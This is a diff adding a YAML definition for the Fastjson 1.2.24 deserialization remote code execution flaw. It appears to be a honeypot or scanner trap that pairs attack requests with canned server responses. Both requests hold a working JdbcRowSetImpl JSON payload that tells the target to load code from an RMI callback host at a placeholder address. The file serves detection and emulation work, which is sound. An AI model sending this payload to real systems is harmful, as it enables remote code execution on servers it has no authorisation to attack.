@@ -1,0 +1,51 @@
+id: fastjson-1-2-24-rce
+info:
+  name: Fastjson 1.2.24 - Remote Code Execution
+  author: zh
+  description: Fastjson 1.2.24 is susceptible to a deserialization remote code execution
+    vulnerability.
+  severity: critical
+  reference:
+  - https://github.com/vulhub/vulhub/tree/master/fastjson/1.2.24-rce
+  - https://www.freebuf.com/vuls/208339.html
+  - https://github.com/wyzxxz/fastjson_rce_tool
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cwe-id: CWE-77
+  metadata:
+    max-request: 2
+  tags: fastjson,rce,deserialization,oast,vulhub
+traps:
+- request:
+    method: POST
+    path: /
+    headers:
+      Content-Type: application/json
+    body: |
+      {
+          "b":{
+              "@type":"com.sun.rowset.JdbcRowSetImpl",
+              "dataSourceName":"rmi://{{interactsh-url}}/Exploit",
+              "autoCommit":true
+          }
+      }
+  response:
+    status_code: 200
+    headers: {}
+    body: Internal Server Error500
+- request:
+    method: POST
+    path: /
+    headers:
+      Content-Type: application/json
+    body: |
+      {
+         "@type":"com.sun.rowset.JdbcRowSetImpl",
+         "dataSourceName":"rmi://{{interactsh-url}}/Exploit",
+         "autoCommit":true
+      }
+  response:
+    status_code: 200
+    headers: {}
+    body: ''
